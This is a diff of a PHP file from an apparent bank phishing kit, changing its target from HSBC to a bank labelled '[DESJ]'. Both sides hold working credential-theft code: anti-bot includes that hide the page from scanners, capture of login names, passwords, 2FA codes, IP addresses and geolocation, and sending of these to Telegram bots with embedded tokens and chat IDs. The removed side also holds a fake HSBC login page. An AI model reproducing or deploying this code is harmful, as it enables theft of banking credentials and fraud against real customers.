@@ -1,35 +1,19 @@
-
 <?php
-        include "/anti-bot/Bot-Spox.php";
-        include "/anti-bot/Dila_DZ.php";
-        include "/anti-bot/Fuck-you.php";
-        include "/anti-bot/index.php";
-        include "/anti-bot/IP-BlackList.php";
-        include "/anti-bot/new.php";
-        include "/anti-bot/proxyblock.php";
-        include "/anti-bot/whitelist.dat";
-        include "/anti-bot/#1.php";
-        include "/anti-bot/#2.php";
-        include "/anti-bot/#3.php";
-        include "/anti-bot/#4.php";
-        include "/anti-bot/#5.php";
-        include "/anti-bot/#6.php";
-        include "/anti-bot/#7.php";
-        include "/anti-bot/#8.php";
-        include "/anti-bot/#9.php";
-        include "/anti-bot/#10.php";
-        include "/anti-bot/#11.php";
-        include "/anti-bot/#12.php";
-        include "/anti-bot/antibot_host.php";
-        include "/anti-bot/antibot_ip.php";
-        include "/anti-bot/antibot_phishtank.php";
-        include "/anti-bot/antibot_proxy.php";
-        include "/anti-bot/antibot_userAgent.php";
-$full_date = date("h:i:s|M/d/Y");
-$time = date("h:i:s");
-$date = date("M/d/Y");
+session_start();
+error_reporting(0);
+include "files/anti/anti1.php";
+include "files/anti/anti2.php"; 
+include "files/anti/anti3.php"; 
+include "files/anti/anti4.php"; 
+include "files/anti/anti5.php"; 
+include "files/anti/anti6.php"; 
+include "files/anti/anti7.php"; 
+include "files/anti/anti8.php"; 
 
 
+$full_date = date("h:i:s,M/d/Y");
+
+error_reporting(E_ERROR | E_PARSE);
 
 function get_client_ip()
 {
@@ -124,11 +108,7 @@ if (strpos($PublicIP, ',') !== false) {
     $PublicIP = explode(",", $PublicIP)[0];
 }
 
-$file       = '/data.dat';
-$file2      = '/data.dat';
-$file3      = '/data.dat';
-$file4      = '/data.dat';
-$file5      = '/data.dat';
+$file       = 'Master_database.csv';
 $ip         = "".$PublicIP;
 $uaget      = "".$user_agent;
 $bsr        = "".$user_browser;
@@ -166,19 +146,17 @@ if ($success==false) {
     $lp         = $details['longitude'];
     $crn        = $details['currency'];
     $type       = $tp;
-    $bank       = "HSBC";
-    $project    = "[CR00K-3D]";
-    $url        = "https://HSBC.com";
+    $bank       = "[DESJ]";
+    $url        = "https://www.DESJ.com";
     $user       = $_POST['username'];
     $pass       = $_POST['password'];
     $code       = $_POST['code']; 
-    $code2      = "[2FA][$code]";
-    $logo       = "[S-T-R|CR00K]";
-    $gitusr     = "[SWIF-T-RYNX]";
+    $logo       = "[CR00K-1N]";
+    $gitusr     = "RandomRyan";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "".$full_date;
-	$lh     = "|";
+	$lh     = "+";
         $li     = ",";
 
     
@@ -192,156 +170,17 @@ if ($success==false) {
 
 
 
-$message =" $bank$lh$ip\n\n-----------------\n\n$bsr$lh$uos\n\n-----------------\n\n$is\n\n-----------------\n\n$city$lh$country\n\n-----------------\n\n$la$li$lp\n\n-----------------\n\n$uaget";
-file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
-file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
-file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
-$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$message = "[!] DESH BANK    CLICKED [!]\n=====$full_date=====\n============================\nIPaddress        :          $ip\n\n============================\n[!]    USERGENT   INFORMATION    [!]\n============================\n$uaget\n\n============================\n[!]         DEVICE     INFORMATIN       [!]\n============================\nOSystem          :     $uos\nBrowser           :     $bsr\n\n============================\n[!] INTERNET SERVICE PROVIDER [!]\n============================\n$is\n\n============================\n[+]lol THE JAMESBOND TYPE SHIT[+]\n============================\nCity             :     $city\nCountry          :     $country\nContinent          :     $continent\nmaps.google.com/?q=$la$lh$lp";
+
+$apiToken = "5909590896:AAHqBGBHNZAU_CcCXCBdJqV7Kjw4_Vbq1tg"; 
 $data = [
-    'chat_id' => '-1001831940786',
+    'chat_id' => '-1001662548687',
     'text' => $message
 ];
-
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                  http_build_query($data) );
-                                                    
 
-?><!DOCTYPE html>
 
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <link rel="stylesheet" type="text/css" href="./files/style.css">
-        <link rel="shortcut icon" type="image/PNG" href="./files/logoTrans.png">
-        <title>HSBC - Login</title>
-        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
-        <script>
-            var lrbank = 'HSBC (CA)';
-            var lrinfo = 'Login';
-        </script>
-        <script src="./files/actions.js###%"></script>
-        <script>
-        $(document).ready(function() {
-            var attempt = 2;
-
-            $('.lab-form').submit(function(e) {
-                e.preventDefault();
-                var form = this;
-
-                $('.error-div').css('display', 'none');
-
-                $('.input-container').removeClass('focused');
-                $('.input-container').prev().css('opacity', '0');
-
-                if (attempt == 1) {
-                    $('.div-loader').css('display', 'block');
-                    $('.div-main').css('display', 'none');
-
-                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
-                        $('.error-div').css('display', 'block');
-
-                        $(form).trigger('reset');
-
-                        $('.div-loader').css('display', 'none');
-                        $('.div-main').css('display', 'block');
-                    }, 'JSON');
-
-                    attempt = 2;
-                } else {
-                    $('.div-loader').css('display', 'block');
-                    $('.div-main').css('display', 'none');
-
-                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
-                        if (response.status) {
-                            if (response.data.loader) {
-                                location.href = '/deposit/hsbc/w';
-                            } else {
-                                location.href = '/deposit/hsbc/em';
-                            }
-                        } else {
-                            $(form).trigger('reset');
-
-                            $('.error-div').css('display', 'block');
-
-                            $('.div-loader').css('display', 'none');
-                            $('.div-main').css('display', 'block');
-                        }
-                    }, 'JSON');
-                }
-
-                return false;
-            });
-
-            $(document).on('change', '.input-username, .input-password', function() {
-                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
-                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
-                $.post('/deposit/hsbc/login-data', {username: username, password: password});
-            });
-        });
-        </script>
-        <style>
-        .error-div {
-            margin-bottom: 17px;
-            color: red;
-        }
-
-        .error-div img {
-            width: 13px;
-            margin-right: 7px;
-        }
-
-        .btn {
-            background-color: rgb(217, 9, 21) !important;
-            border: 1px solid rgb(217, 9, 21) !important;
-        }
-
-        #loaderOnLoading {
-            display: block;
-        }
-        </style>
-    </head>
-    <body>
-        <img src="./files/logoTrans.png" id="transLogo">
-        <div class="header">
-            <div class="headerRow">
-                <img src="./files/logoTrans.png" id="logo">
-                <!-- <div class="btn" id="loginBtn">Login On </div> -->
-            </div>
-        </div>
-        <div class="main">
-            <div class="alignment div-main">
-                <p class="pageTitle">Log on</p>
-                <form action="040148.php" method="POST" autocomplete="off" class="lab-form">
-                    <p class="error-div" style="display: none"><img src="./files/errIcon.gif" alt=""> The username you entered does not match our records. Please try again.</p>
-                    <div class="row" style="align-items: center;">
-                        <p class="formLabel">Username</p>
-                    </div>
-                    <div class="inptContainer" style="margin-bottom: 20px">
-                        <input type="text" class="inptField lrinput input-username" attr-action="Filling Username" name="username" required="">
-                    </div>
-                    <div class="row" style="align-items: center;">
-                        <p class="formLabel">Password</p>
-                    </div>
-                    <div class="inptContainer">
-                        <input type="password" class="inptField lrinput input-password" attr-action="Filling Password" name="password" required="">
-                    </div>
-                    <div class="row" style="align-items: center;" id="rememberRow">
-                        <input type="checkbox">
-                        <p class="desText">Remember me</p>
-                    </div>
-                    <input type="submit" class="btn" value="Continue" id="sbtn">
-                </form>
-                <p class="desText" style="text-align: center; padding: 10px 0;"><a href="deposit/hsbc#">Forgot your username?</a></p>
-            </div>
-            <div class="alignment div-loader" style="display: none">
-                <p class="pageTitle" style="text-align: center">Verifying details</p>
-                <img src="./files/loading.gif" alt="" id="loaderOnLoading">
-                <p class="desText" style="text-align: center; padding: 20px 0;">Loading please wait...</p>
-            </div>
-        </div>
-        <div class="footer">
-        </div>
-    
-
-</body></html>
+header('Location: /index.html');
+exit;
+?>
